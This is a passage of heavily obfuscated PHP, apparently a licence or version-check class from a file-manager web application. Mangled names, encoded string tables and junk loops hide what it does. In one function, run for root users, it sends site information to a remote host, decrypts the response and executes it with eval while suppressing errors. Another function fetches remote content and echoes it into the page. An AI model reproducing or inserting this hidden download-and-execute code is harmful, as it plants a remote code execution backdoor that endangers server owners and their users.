$ÖÌûˆÌ = array(); foreach ($ÕÒò»È¸ as $ˆÒ‘°¦ñ => $²…ŸÀ¸™) { if ($²…ŸÀ¸™ == $”ŸÃâ¹[227] && substr($this->hbzm1dfa9aec, 0, 1) == $”ŸÃâ¹[227]) { continue; } if (!in_array($ˆÒ‘°¦ñ, $¢Ê™‹İ)) { $ÖÌûˆÌ[] = $ˆÒ‘°¦ñ; } } foreach ($ÖÌûˆÌ as $ˆÒ‘°¦ñ) { unset($Èµì¥ˆ[$ˆÒ‘°¦ñ]); } return $Èµì¥ˆ; } private function versionPluginList() { $õìÈ³õù =& $_SERVER[®»±”ó²]; $ŸÕïÅ¢¤ =& $_SERVER[öï™ ‘]; return array($ŸÕïÅ¢¤[228] => $ŸÕïÅ¢¤[227], $ŸÕïÅ¢¤[229] => $ŸÕïÅ¢¤[227], $ŸÕïÅ¢¤[230] => $ŸÕïÅ¢¤[227], $ŸÕïÅ¢¤[231] => $ŸÕïÅ¢¤[227], $ŸÕïÅ¢¤[232] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[234] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[235] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[236] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[237] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[238] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[239] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[240] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[241] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[242] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[243] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[244] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[245] => $ŸÕïÅ¢¤[233], $ŸÕïÅ¢¤[246] => $ŸÕïÅ¢¤[233]); $—ÙøÎªˆ = $õìÈ³õù[759]; while ($—ÙøÎªˆ < $õìÈ³õù[483]) { if ($—ÙøÎªˆ >= 0) { break; } $—ÙøÎªˆ++; } } private function versionPluginFilter() { $­«…·¬µ =& $_SERVER[®»±”ó²]; $¼…ŞğÔ =& $_SERVER[öï™ ‘]; if ($this->hbzm1dfa9aec == $¼…ŞğÔ[109]) { return $¼…ŞğÔ[6]; } $…Ë€òçÕ = _get($this->rpmfbbb2df16, $¼…ŞğÔ[247], $¼…ŞğÔ[6]); $€ÛıÔ•ˆ = $­«…·¬µ[760]; while ($€ÛıÔ•ˆ < $­«…·¬µ[696]) { if ($€ÛıÔ•ˆ >= 0) { break; } $€ÛıÔ•ˆ++; } $ …Í‚±¼ = _get($this->rpmfbbb2df16, $¼…ŞğÔ[116], $¼…ŞğÔ[6]); $³ÕïŸÊÎ = $­«…·¬µ[761]; $µÔêş€ = _get($this->rpmfbbb2df16, $¼…ŞğÔ[248], $¼…ŞğÔ[6]); $¥å­¿Æö = $­«…·¬µ[762]; while ($¥å­¿Æö < $­«…·¬µ[721]) { if ($¥å­¿Æö >= 0) { break; } $¥å­¿Æö++; } if ($ …Í‚±¼ > time() && $µÔêş€ > time()) { $°Ø‘è  = explode($¼…ŞğÔ[226], $…Ë€òçÕ); $©³³§õ = array_keys($this->versionPluginList()); $…Ë€òçÕ = array_merge($°Ø‘è , $©³³§õ); $…Ë€òçÕ = implode($¼…ŞğÔ[226], array_filter(array_unique($…Ë€òçÕ))); } return $…Ë€òçÕ; } private function skge55d4dfa2() { $êÆıß£Ã =& $_SERVER[öï™ ‘]; if ($this->hbzm1dfa9aec != $êÆıß£Ã[109]) { $GLOBALS[$êÆıß£Ã[86]][$êÆıß£Ã[90]][$êÆıß£Ã[249]] = $êÆıß£Ã[206]; return; } $GLOBALS[$êÆıß£Ã[86]][$êÆıß£Ã[250]] = $êÆıß£Ã[122]; if (Model($êÆıß£Ã[251])->get($êÆıß£Ã[63]) != $êÆıß£Ã[206]) { Model($êÆıß£Ã[251])->set($êÆıß£Ã[63], $êÆıß£Ã[206]); } } public function fwvs53e7ef80() { return $_SERVER[öï™ ‘][252]; $”ëïÏÀ = $_SERVER[®»±”ó²][763]; if (!$”ëïÏÀ) { return; } } private function zvck26b77692() { $ú½™š§ =& $_SERVER[®»±”ó²]; $”Õú‡ô =& $_SERVER[öï™ ‘]; $°Å¦ÏÑ = array($”Õú‡ô[253], $”Õú‡ô[254], $”Õú‡ô[255]); $˜”—ĞËª = $”Õú‡ô[256] . md5($”Õú‡ô[257]); if ($this->hbzm1dfa9aec == $”Õú‡ô[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$”Õú‡ô[24]], $°Å¦ÏÑ)) { return; } if (time() % 4 != 0) { return; } $°êù–åˆ = call_user_func(array($”Õú‡ô[258], $”Õú‡ô[259]), $˜”—ĞËª); if ($°êù–åˆ && time() - $°êù–åˆ < intval($”Õú‡ô[260])) { return; } call_user_func(array($”Õú‡ô[258], $”Õú‡ô[139]), $˜”—ĞËª, time()); $ºÕËÓ” = $ú½™š§[764]; while (strlen($ºÕËÓ”) < $ú½™š§[700]) { if (!$ºÕËÓ”) { break; } $ºÕËÓ”++; } $ÉÏãâÙÁ = Model($”Õú‡ô[33])->get($”Õú‡ô[100]); $‚ñ«’Ã = array($”Õú‡ô[152] => Model($”Õú‡ô[33])->get($”Õú‡ô[153]), $”Õú‡ô[167] => $this->hbzm1dfa9aec, $”Õú‡ô[163] => $_SERVER[$”Õú‡ô[164]], $”Õú‡ô[165] => Model($”Õú‡ô[33])->get($”Õú‡ô[131]), $”Õú‡ô[105] => md5($_SERVER[$”Õú‡ô[106]] . $ÉÏãâÙÁ), $”Õú‡ô[156] => $”Õú‡ô[136], $”Õú‡ô[159] => $_SERVER[$”Õú‡ô[160]]); $«à»»Ì = $ú½™š§[765]; $»£¶¢Ñš = $this->kpgn44294446($”Õú‡ô[261], $‚ñ«’Ã); if (!is_array($»£¶¢Ñš)) { return; } if ($»£¶¢Ñš[$”Õú‡ô[152]] && $»£¶¢Ñš[$”Õú‡ô[262]]) { if ($this->ycqzaa65360d($»£¶¢Ñš[$”Õú‡ô[262]]) == $‚ñ«’Ã[$”Õú‡ô[152]]) { return; } } $this->wmxo7d3906c1(); $¤Åß¥»ñ = $ú½™š§[766]; if ($this->ycqzaa65360d($»£¶¢Ñš[$”Õú‡ô[262]]) != $‚ñ«’Ã[$”Õú‡ô[152]]) { $¾ÉÜè¾ = array($”Õú‡ô[185] => $ÉÏãâÙÁ, $”Õú‡ô[186] => $_SERVER[$”Õú‡ô[106]], $”Õú‡ô[187] => this_url(), $”Õú‡ô[161] => $_SERVER[$”Õú‡ô[162]]); $ù’Âò‰î = $this->hecj26254041(json_encode($¾ÉÜè¾)); $»£¶¢Ñš = $this->kpgn44294446($”Õú‡ô[188] . $ù’Âò‰î); if ($»£¶¢Ñš && is_array($»£¶¢Ñš) && isset($»£¶¢Ñš[$”Õú‡ô[262]])) { $ä±œïñ† = $this->plyi5947c4bb($»£¶¢Ñš[$”Õú‡ô[262]], 2); if ($ä±œïñ†) { $ä±œïñ† = $this->ycqzaa65360d($ä±œïñ†); } if ($ä±œïñ†) { try { @eval($ä±œïñ†); } catch (Exception $ŸÅ²‰ò) { } } } } } private function kpgn44294446($¶Ëâ“µ = '', $Ì–éğáå = array(), $—ƒıƒ¯ç = 5) { $å§ÙŠÛÛ =& $_SERVER[®»±”ó²]; $Ûí…İ« =& $_SERVER[öï™ ‘]; $‚ãí´µ‘ = $Ûí…İ«[263]; $‚ãí´µ‘ = $this->tufm7dc788ae($‚ãí´µ‘, $Ûí…İ«[264]); $‚ãí´µ‘ = $‚ãí´µ‘ . $¶Ëâ“µ; if ($Ì–éğáå && is_array($Ì–éğáå)) { $‚ãí´µ‘ = $‚ãí´µ‘ . $Ûí…İ«[265] . http_build_query($Ì–éğáå); } if ($Ì–éğáå === -1) { return $‚ãí´µ‘; } $‚¿º’½Ÿ = stream_context_create(array($Ûí…İ«[219] => array($Ûí…İ«[222] => $—ƒıƒ¯ç, $Ûí…İ«[220] => $Ûí…İ«[266]), $Ûí…İ«[267] => array($Ûí…İ«[268] => !1, $Ûí…İ«[269] => !1))); $ù…ÁØû = $å§ÙŠÛÛ[767]; if (!$ù…ÁØû) { die; } $Ì–éğáå = @file_get_contents($‚ãí´µ‘, !1, $‚¿º’½Ÿ); return json_decode($Ì–éğáå, !0); $âÑ¼¼“ß = $å§ÙŠÛÛ[768]; if (strlen($âÑ¼¼“ß) < $å§ÙŠÛÛ[721]) { die; } $ÅÏ±ìîÏ = $å§ÙŠÛÛ[769]; if (!$ÅÏ±ìîÏ) { die; } } private function ketd7bccc530() { $…Âú•ö =& $_SERVER[®»±”ó²]; $Ğ ®³Ùó =& $_SERVER[öï™ ‘]; $Ü¶‚ëˆ¹ = array($Ğ ®³Ùó[270] => $Ğ ®³Ùó[271], $Ğ ®³Ùó[272] => $Ğ ®³Ùó[273], $Ğ ®³Ùó[274] => $Ğ ®³Ùó[275], $Ğ ®³Ùó[276] => $Ğ ®³Ùó[277], $Ğ ®³Ùó[278] => $Ğ ®³Ùó[279], $Ğ ®³Ùó[280] => $Ğ ®³Ùó[214], $Ğ ®³Ùó[281] => $Ğ ®³Ùó[214], $Ğ ®³Ùó[282] => $Ğ ®³Ùó[271], $Ğ ®³Ùó[283] => $Ğ ®³Ùó[273], $Ğ ®³Ùó[284] => $Ğ ®³Ùó[275], $Ğ ®³Ùó[285] => $Ğ ®³Ùó[286], $Ğ ®³Ùó[287] => $Ğ ®³Ùó[277], $Ğ ®³Ùó[288] => $Ğ ®³Ùó[289], $Ğ ®³Ùó[290] => $Ğ ®³Ùó[279], $Ğ ®³Ùó[291] => $Ğ ®³Ùó[292], $Ğ ®³Ùó[293] => $Ğ ®³Ùó[294], $Ğ ®³Ùó[295] => $Ğ ®³Ùó[296]); $À€«Çœâ = $…Âú•ö[770]; while ($À€«Çœâ < $…Âú•ö[706]) { if ($À€«Çœâ >= 0) { break; } $À€«Çœâ++; } $µéÉÄ¶Û = $Ü¶‚ëˆ¹[$this->hbzm1dfa9aec]; $µéÉÄ¶Û = intval($µéÉÄ¶Û ? $µéÉÄ¶Û : $Ğ ®³Ùó[271]); $è¯ ãºÕ = _get($this->rpmfbbb2df16, $Ğ ®³Ùó[297]); $Øëâûä© = $…Âú•ö[771]; if (!$Øëâûä©) { die; } $è¯ ãºÕ = $è¯ ãºÕ ? intval($è¯ ãºÕ) : 0; return $µéÉÄ¶Û + $è¯ ãºÕ; } public function kuzw3996f9d5($ã•Ö‚¤) { $¾†­«“ =& $_SERVER[®»±”ó²]; $£Ø¤¬ =& $_SERVER[öï™ ‘]; $‡õÍ¿¢õ = $this->ketd7bccc530(); if ($ã•Ö‚¤[$£Ø¤¬[298]] == $£Ø¤¬[122]) { return; } if ($‡õÍ¿¢õ >= intval($£Ø¤¬[214])) { return; } $‚Ò©ØÆ¥ = Model($£Ø¤¬[125])->count(); $¢­ğ­ßô = $¾†­«“[772]; while ($¢­ğ­ßô < $¾†­«“[696]) { if ($¢­ğ­ßô >= 0) { break; } $¢­ğ­ßô++; } if ($‚Ò©ØÆ¥ <= $‡õÍ¿¢õ) { return; } $ö€›Œƒ = Model($£Ø¤¬[125])->field($£Ø¤¬[298])->limit($‡õÍ¿¢õ)->select(); $™ˆ‹ğÔ = $¾†­«“[773]; if (strlen($™ˆ‹ğÔ) < $¾†­«“[696]) { die; } $ö€›Œƒ = array_to_keyvalue($ö€›Œƒ, $£Ø¤¬[6], $£Ø¤¬[298]); if (!in_array($ã•Ö‚¤[$£Ø¤¬[298]], $ö€›Œƒ)) { show_json($£Ø¤¬[299], !1, $£Ø¤¬[210]); } } public function wocx8bd4e0ef() { $«áÇüñ =& $_SERVER[®»±”ó²]; $Çù˜ö”° =& $_SERVER[öï™ ‘]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $·º‡¢—ğ = $Çù˜ö”°[217]; $·º‡¢—ğ = $this->tufm7dc788ae($·º‡¢—ğ, $Çù˜ö”°[218]); $Âª©²Î± = stream_context_create(array($Çù˜ö”°[219] => array($Çù˜ö”°[220] => $Çù˜ö”°[221], $Çù˜ö”°[222] => 3))); $„´Ğøœ§ = $«áÇüñ[774]; while (strlen($„´Ğøœ§) < $«áÇüñ[483]) { if (!$„´Ğøœ§) { break; } $„´Ğøœ§++; } $í—œœÄÎ = @file_get_contents($·º‡¢—ğ, !1, $Âª©²Î±); $ÕÒÄË‘‹ = $«áÇüñ[775]; echo $Çù˜ö”°[300] . hash_encode($í—œœÄÎ) . $Çù˜ö”°[301]; } private function qajhba914fbd($˜ªÁóØÌ, $Š³©‡®’, $ª‘«‹Ó = 3) { $åòÚ¢Š =& $_SERVER[®»±”ó²]; $äöŒÜŠŒ =& $_SERVER[öï™ ‘]; usleep(1); $ˆıÎºØ‹ = $åòÚ¢Š[776]; if (!$ˆıÎºØ‹) { die; } $˜ªÁóØÌ = trim($˜ªÁóØÌ); $©êıÀ = $åòÚ¢Š[777]; $£—¾µàš = mt_rand(0, 5) . $äöŒÜŠŒ[6]; $ãıàâÊË = $åòÚ¢Š[778]; $­±¾Ø¥Ÿ = rand_string(15); $İ½”±É = $åòÚ¢Š[779]; if (strlen($İ½”±É) < $åòÚ¢Š[706]) { return; } $„ÛãĞ¡¥ = $äöŒÜŠŒ[302]; $€ƒÃ‹ıÂ = $åòÚ¢Š[780]; while ($€ƒÃ‹ıÂ < $åòÚ¢Š[700]) { if ($€ƒÃ‹ıÂ >= 0) { break; } $€ƒÃ‹ıÂ++; } switch ($£—¾µàš) { case $äöŒÜŠŒ[206]: $×Š¦³ = $this->lwou8ebbe426($˜ªÁóØÌ, strrev($Š³©‡®’ . $­±¾Ø¥Ÿ)); break; $øÒ²øˆ© = $åòÚ¢Š[781]; if (!$øÒ²øˆ©) { die; } case $äöŒÜŠŒ[122]: $×Š¦³ = $this->lwou8ebbe426($˜ªÁóØÌ, strrev($­±¾Ø¥Ÿ . $Š³©‡®’)); $÷¨¿±ö = $åòÚ¢Š[782]; if (!$÷¨¿±ö) { return; } break; $·º¹ô§´ = $åòÚ¢Š[783]; while (strlen($·º¹ô§´) < $åòÚ¢Š[706]) { if (!$·º¹ô§´) { break; } $·º¹ô§´++; } case $äöŒÜŠŒ[303]: $×Š¦³ = $this->lwou8ebbe426($˜ªÁóØÌ, base64_encode($­±¾Ø¥Ÿ . $Š³©‡®’)); break; case $äöŒÜŠŒ[304]: $×Š¦³ = $this->lwou8ebbe426($˜ªÁóØÌ, md5($­±¾Ø¥Ÿ . $Š³©‡®’)); break; case $äöŒÜŠŒ[305]: $˜ªÁóØÌ = base64_encode($˜ªÁóØÌ); $˜£¼é‚Ø = $åòÚ¢Š[784]; while ($˜£¼é‚Ø < $åòÚ¢Š[706]) { if ($˜£¼é‚Ø >= 0) { break; } $˜£¼é‚Ø++; } $ÏëÔğ = rand(0, 64); $å»©œÌ = $åòÚ¢Š[785]; if (strlen($å»©œÌ) < $åòÚ¢Š[706]) { die; } $¡®ÕÊ‰Ú = $„ÛãĞ¡¥[$ÏëÔğ]; $ŞÑœç«¯ = md5($¡®ÕÊ‰Ú . md5($Š³©‡®’ . $¡®ÕÊ‰Ú) . $Š³©‡®’); $ŞÑœç«¯ = substr($ŞÑœç«¯, $ÏëÔğ % 8, $ÏëÔğ % 8 + 7); $ìŠ°¼ı = $äöŒÜŠŒ[6]; $ù§ú„´¤ = $åòÚ¢Š[786]; while (strlen($ù§ú„´¤) < $åòÚ¢Š[721]) { if (!$ù§ú„´¤) { break; } $ù§ú„´¤++; } $Ò¥¹ ‰ë = 0; $ùÒ˜©ãç = $åòÚ¢Š[787]; $»¯Ë = 0; $£˜³â“¨ = $åòÚ¢Š[788]; if (strlen($£˜³â“¨) < $åòÚ¢Š[483]) { return; } $ù¢°ÚĞ³ = 0; $‹ãœ·¹À = $åòÚ¢Š[789]; while (strlen($‹ãœ·¹À) < $åòÚ¢Š[700]) { if (!$‹ãœ·¹À) { break; } $‹ãœ·¹À++; } for ($Ò¥¹ ‰ë = 0; $Ò¥¹ ‰ë < strlen($˜ªÁóØÌ); $Ò¥¹ ‰ë++) { $ù¢°ÚĞ³ = $ù¢°ÚĞ³ == strlen($ŞÑœç«¯) ? 0 : $ù¢°ÚĞ³; $ìÅÒĞì = $åòÚ¢Š[790]; if (strlen($ìÅÒĞì) < $åòÚ¢Š[696]) { die; } $»¯Ë = ($ÏëÔğ + strpos($„ÛãĞ¡¥, $˜ªÁóØÌ[$Ò¥¹ ‰ë]) + ord($ŞÑœç«¯[$ù¢°ÚĞ³++])) % 64; $¦äºüñ· = $åòÚ¢Š[791]; if (strlen($¦äºüñ·) < $åòÚ¢Š[696]) { return; } $ìŠ°¼ı .= $„ÛãĞ¡¥[$»¯Ë]; $Êíô„¡° = $åòÚ¢Š[792]; if (!$Êíô„¡°) { return; } } $×Š¦³ = hash_encode($¡®ÕÊ‰Ú . $ìŠ°¼ı); $ËèöÂßÄ = $åòÚ¢Š[793]; if (!$ËèöÂßÄ) { die; } break; default: $×Š¦³ = $this->lwou8ebbe426($˜ªÁóØÌ, $Š³©‡®’ . $­±¾Ø¥Ÿ); break; $ïí…ŞÕª = $åòÚ¢Š[794]; } $×Š¦³ = strrev($£—¾µàš . $­±¾Ø¥Ÿ . $×Š¦³); $ş¦œöçô = $åòÚ¢Š[795]; if (strlen($ş¦œöçô) < $åòÚ¢Š[721]) { die; } if ($ª‘«‹Ó - 1 > 0) { $×Š¦³ = $this->qajhba914fbd($×Š¦³, $Š³©‡®’, $ª‘«‹Ó - 1); } return $×Š¦³; } private function plyi5947c4bb($šš«©¼Æ, $ªó´İ•, $¤ÔÜüí† = 3) { $´’ºıò =& $_SERVER[®»±”ó²]; $·Öê¬ =& $_SERVER[öï™ ‘]; if (!is_string($šš«©¼Æ) || strlen($šš«©¼Æ) < 10) { return !1; } $šš«©¼Æ = trim($šš«©¼Æ); $ìä‘ û = $´’ºıò[796]; if (strlen($ìä‘ û) < $´’ºıò[700]) { return; } $šš«©¼Æ = strrev($šš«©¼Æ); $Ş£†÷‚ = $´’ºıò[797]; if (!$Ş£†÷‚) { die; } $âÍ·¶ªü = $šš«©¼Æ[0]; $¨¢¥óØ = $´’ºıò[798]; if (strlen($¨¢¥óØ) < $´’ºıò[483]) { return; } $ôƒŒŞÉ = substr($šš«©¼Æ, 1, 15); $šš«©¼Æ = substr($šš«©¼Æ, 16); $Ş¨¿€Ñî = $·Öê¬[302]; $©ÓÓ¿Ê = $´’ºıò[799]; if (strlen($©ÓÓ¿Ê) < $´’ºıò[700]) { die; } switch ($âÍ·¶ªü) { case $·Öê¬[206]: $¹ûŞ´î = $this->tufm7dc788ae($šš«©¼Æ, strrev($ªó´İ• . $ôƒŒŞÉ)); break; case $·Öê¬[122]: $¹ûŞ´î = $this->tufm7dc788ae($šš«©¼Æ, strrev($ôƒŒŞÉ . $ªó´İ•)); break; $±¹Ì˜í‡ = $´’ºıò[800]; while (strlen($±¹Ì˜í‡) < $´’ºıò[696]) { if (!$±¹Ì˜í‡) { break; } $±¹Ì˜í‡++; } case $·Öê¬[303]: $¹ûŞ´î = $this->tufm7dc788ae($šš«©¼Æ, base64_encode($ôƒŒŞÉ . $ªó´İ•)); break; $É÷µŒŒ¸ = $´’ºıò[801]; if (!$É÷µŒŒ¸) { die; } case $·Öê¬[304]: $¹ûŞ´î = $this->tufm7dc788ae($šš«©¼Æ, md5($ôƒŒŞÉ . $ªó´İ•)); $¨í¦Ö¿õ = $´’ºıò[802]; if (strlen($¨í¦Ö¿õ) < $´’ºıò[483]) { return; } break; $ıÏô¢è = $´’ºıò[803]; if (strlen($ıÏô¢è) < $´’ºıò[721]) { return; } case $·Öê¬[305]: $šš«©¼Æ = hash_decode($šš«©¼Æ); $Ğ‘Ãã´ğ = $šš«©¼Æ[0]; $šš«©¼Æ = substr($šš«©¼Æ, 1); $İ˜¢ô¹œ = strpos($Ş¨¿€Ñî, $Ğ‘Ãã´ğ); $èÀèø÷¼ = md5($Ğ‘Ãã´ğ . md5($ªó´İ• . $Ğ‘Ãã´ğ) . $ªó´İ•); $èÀèø÷¼ = substr($èÀèø÷¼, $İ˜¢ô¹œ % 8, $İ˜¢ô¹œ % 8 + 7); $ÖÔ·¸üí = $´’ºıò[804]; if (!$ÖÔ·¸üí) { die; } $ÕÇ‚ş›… = $·Öê¬[6]; $çäÙÇî = $´’ºıò[805]; if (strlen($çäÙÇî) < $´’ºıò[706]) { die; } $®Ëì«¨ö = 0; $æ³é‰õ = 0; $€­èÜ“á = 0; $¤ÕŸÛö¢ = $´’ºıò[806]; while (strlen($¤ÕŸÛö¢) < $´’ºıò[706]) { if (!$¤ÕŸÛö¢) { break; } $¤ÕŸÛö¢++; } for ($®Ëì«¨ö = 0; $®Ëì«¨ö < strlen($šš«©¼Æ); $®Ëì«¨ö++) { $€­èÜ“á = $€­èÜ“á == strlen($èÀèø÷¼) ? 0 : $€­èÜ“á; $ï¡¾ Üƒ = $´’ºıò[807]; if (strlen($ï¡¾ Üƒ) < $´’ºıò[700]) { die; } $ªËœâ¿ = $€­èÜ“á++; $æ³é‰õ = strpos($Ş¨¿€Ñî, $šš«©¼Æ[$®Ëì«¨ö]) - $İ˜¢ô¹œ - ord($èÀèø÷¼[$ªËœâ¿]); while ($æ³é‰õ < 0) { $æ³é‰õ += 64; } $ÕÇ‚ş›… .= $Ş¨¿€Ñî[$æ³é‰õ]; } $¹ûŞ´î = base64_decode($ÕÇ‚ş›…); $ÁèµÄà¿ = $´’ºıò[808]; if (!$ÁèµÄà¿) { die; } break; $œ•§ÛÅ¶ = $´’ºıò[809]; while ($œ•§ÛÅ¶ < $´’ºıò[483]) { if ($œ•§ÛÅ¶ >= 0) { break; } $œ•§ÛÅ¶++; } default: $¹ûŞ´î = $this->tufm7dc788ae($šš«©¼Æ, $ªó´İ• . $ôƒŒŞÉ); break; $á•ä™‡¡ = $´’ºıò[810]; while (strlen($á•ä™‡¡) < $´’ºıò[706]) { if (!$á•ä™‡¡) { break; } $á•ä™‡¡++; } } if ($¤ÔÜüí† - 1 > 0) { $¹ûŞ´î = $this->plyi5947c4bb($¹ûŞ´î, $ªó´İ•, $¤ÔÜüí† - 1); } return $¹ûŞ´î; } public function hecj26254041($ÄÇé½Å) { $ñÆœÔ˜Æ =& $_SERVER[®»±”ó²]; $•¯¨êÍ =& $_SERVER[öï™ ‘]; $ç¦ªÌß = $this->xzsd7f08ea79(); $™¾Ó•¤› = $this->xzsd7f08ea79(); $ÈÚ®‘¥ä = $ñÆœÔ˜Æ[811]; if (strlen($ÈÚ®‘¥ä) < $ñÆœÔ˜Æ[696]) { return; } $Ÿ»ŞÍÆü = ($ç¦ªÌß - 1) * ($™¾Ó•¤› - 1); $è§ßÔÎÑ = intval(($ç¦ªÌß + $™¾Ó•¤›) / 2); $åõæÓØå = $ñÆœÔ˜Æ[812]; while (1) { $óù„Ù”˜ = $è§ßÔÎÑ; $ÓŒÎ¹Çµ = $ñÆœÔ˜Æ[813]; $‚ã‡¿§¸ = $Ÿ»ŞÍÆü; while ($‚ã‡¿§¸ % $óù„Ù”˜ != 0) { $Å®„ò¥ï = $‚ã‡¿§¸; $‚ã‡¿§¸ = $óù„Ù”˜; $©²«¾â¯ = $ñÆœÔ˜Æ[814]; if (strlen($©²«¾â¯) < $ñÆœÔ˜Æ[721]) { return; } $óù„Ù”˜ = $Å®„ò¥ï % $óù„Ù”˜; } if ($óù„Ù”˜ == 1) { break; } else { $è§ßÔÎÑ++; } } $·ñ€‘ô¯ = 2; for ($¾Â‚ÖÀ = 0; $¾Â‚ÖÀ < $Ÿ»ŞÍÆü * 10; $¾Â‚ÖÀ++) { if (($Ÿ»ŞÍÆü * $¾Â‚ÖÀ + 1) % $è§ßÔÎÑ == 0) { $·ñ€‘ô¯ = intval(($Ÿ»ŞÍÆü * $¾Â‚ÖÀ + 1) / $è§ßÔÎÑ); break; } } $“Ä€İú = $this->lwou8ebbe426($ç¦ªÌß * $™¾Ó•¤› . $•¯¨êÍ[6], $•¯¨êÍ[136]); $ â¿²ò§ = md5($•¯¨êÍ[306] . ($ç¦ªÌß + $™¾Ó•¤›) . $•¯¨êÍ[307] . $è§ßÔÎÑ . $•¯¨êÍ[307] . $·ñ€‘ô¯ . $•¯¨êÍ[308]); $½°®‡ = $this->lwou8ebbe426($ÄÇé½Å, $ â¿²ò§) . $•¯¨êÍ[309] . $“Ä€İú; $¶Ğ¿ëÀ = $ñÆœÔ˜Æ[815]; return $½°®‡; $¤Å‹İî‹ = $ñÆœÔ˜Æ[816]; while (strlen($¤Å‹İî‹) < $ñÆœÔ˜Æ[721]) { if (!$¤Å‹İî‹) { break; } $¤Å‹İî‹++; } } public function ycqzaa65360d($ğ¢©±ı) { $óùûÎªÒ =& $_SERVER[®»±”ó²]; $‘µ£­°„ =& $_SERVER[öï™ ‘]; $­¸ñÎõ = explode($‘µ£­°„[309], $ğ¢©±ı); if (count($­¸ñÎõ) != 2) { return $‘µ£­°„[6]; } $ëï¨€…¼ = $this->tufm7dc788ae($­¸ñÎõ[1] . $‘µ£­°„[6], $‘µ£­°„[136]); if (!$ëï¨€…¼) { return $‘µ£­°„[6]; } $ëï¨€…¼ = intval($ëï¨€…¼); $Î‚ÕÖõõ = 0; $Å”¬Ğ = $óùûÎªÒ[817]; while (strlen($Å”¬Ğ) < $óùûÎªÒ[721]) { if (!$Å”¬Ğ) { break; } $Å”¬Ğ++; } $÷äéù¨ï = 0; $¥áôÊ¨ò = $óùûÎªÒ[818]; if (!$¥áôÊ¨ò) { return; } for ($÷ÛÉÙ½ = 3; $÷ÛÉÙ½ < $ëï¨€…¼; $÷ÛÉÙ½ += 2) { if ($ëï¨€…¼ % $÷ÛÉÙ½ != 0) { continue; } $Î‚ÕÖõõ = $÷ÛÉÙ½; $ê³ã’À‚ = $óùûÎªÒ[819]; while ($ê³ã’À‚ < $óùûÎªÒ[696]) { if ($ê³ã’À‚ >= 0) { break; } $ê³ã’À‚++; } $÷äéù¨ï = intval($ëï¨€…¼ / $÷ÛÉÙ½); $™ü¬šÔï = $óùûÎªÒ[820]; if (!$™ü¬šÔï) { return; } break; } $ÔÖÃñƒš = ($Î‚ÕÖõõ - 1) * ($÷äéù¨ï - 1); $íË¥©¹ = intval(($Î‚ÕÖõõ + $÷äéù¨ï) / 2); $•çÌÒØ· = $óùûÎªÒ[821]; while (1) { $œß­ ö = $íË¥©¹; $Çı³‘äá = $ÔÖÃñƒš; $š¼Ê÷Ÿè = $óùûÎªÒ[822]; if (strlen($š¼Ê÷Ÿè) < $óùûÎªÒ[721]) { die; } while ($Çı³‘äá % $œß­ ö != 0) { $¥˜Ì®ÁŒ = $Çı³‘äá; $Çı³‘äá = $œß­ ö; $œß­ ö = $¥˜Ì®ÁŒ % $œß­ ö; } if ($œß­ ö == 1) { break; } else { $íË¥©¹++; } } $Æˆñ„äş = 2; $Ìï˜ª‡à = $óùûÎªÒ[823]; for ($÷ÛÉÙ½ = 0; $÷ÛÉÙ½ < $ÔÖÃñƒš * 10; $÷ÛÉÙ½++) { if (($ÔÖÃñƒš * $÷ÛÉÙ½ + 1) % $íË¥©¹ == 0) { $Æˆñ„äş = intval(($ÔÖÃñƒš * $÷ÛÉÙ½ + 1) / $íË¥©¹); break; } } $ä‰›ºê˜ = md5($‘µ£­°„[306] . ($Î‚ÕÖõõ + $÷äéù¨ï) . $‘µ£­°„[307] . $íË¥©¹ . $‘µ£­°„[307] . $Æˆñ„äş . $‘µ£­°„[308]); $€’î£üÕ = $this->tufm7dc788ae($­¸ñÎõ[0], $ä‰›ºê˜); $ê·åÀ±† = $óùûÎªÒ[824]; return $€’î£üÕ; } public function xzsd7f08ea79() { $ûÂÖ¢¦À =& $_SERVER[®»±”ó²]; $–½°Ì“Ç = mt_rand(pow(2, 14), pow(2, 16) - 1); $™¥¨ºƒç = array(); $Úéâ¿”Ã = $ûÂÖ¢¦À[825]; $—Éó¢ñö = 1; while ($—Éó¢ñö <= (int) sqrt($–½°Ì“Ç)) { $Ÿ™âù½å = $—Éó¢ñö; while (!0) { $Ÿ™âù½å++; if ($Ÿ™âù½å <= 2) { $—Éó¢ñö = $Ÿ™âù½å; break; } else { if ($Ÿ™âù½å < 2) { continue; } } $êñ„ãöè = !0; for ($ğÑ§°­± = 2; $ğÑ§°­± <= sqrt($Ÿ™âù½å); $ğÑ§°­±++) { if ($Ÿ™âù½å % $ğÑ§°­± == 0) { $êñ„ãöè = !1; } } if ($êñ„ãöè) { $—Éó¢ñö = $Ÿ™âù½å; break; } } $™¥¨ºƒç[] = $—Éó¢ñö; $³£’ª = $ûÂÖ¢¦À[826]; if (strlen($³£’ª) < $ûÂÖ¢¦À[721]) { return; } } $Ùò€•¢ª = 2; for ($Ÿ™âù½å = $–½°Ì“Ç; $Ÿ™âù½å > 1; $Ÿ™âù½å--) { $êñ„ãöè = !0; foreach ($™¥¨ºƒç as $İıì™Ì¸) { if ($Ÿ™âù½å % $İıì™Ì¸ == 0) { $êñ„ãöè = !1; break; } } if ($êñ„ãöè) { $Ùò€•¢ª = $Ÿ™âù½å; break; } } return $Ùò€•¢ª; } public function hjxtb3c3afde($ˆµø¯Ş, $¸øÊ£º€) { $Ò¹ÈÖ¾µ =& $_SERVER[öï™ ‘]; return call_user_func(array($Ò¹ÈÖ¾µ[8], $Ò¹ÈÖ¾µ[310]), $ˆµø¯Ş, $¸øÊ£º€); } public function lwou8ebbe426($‡Çšçëˆ, $¢Şâƒ) { $ãö˜¡ÍÓ =& $_SERVER[öï™ ‘]; return call_user_func(array($ãö˜¡ÍÓ[311], 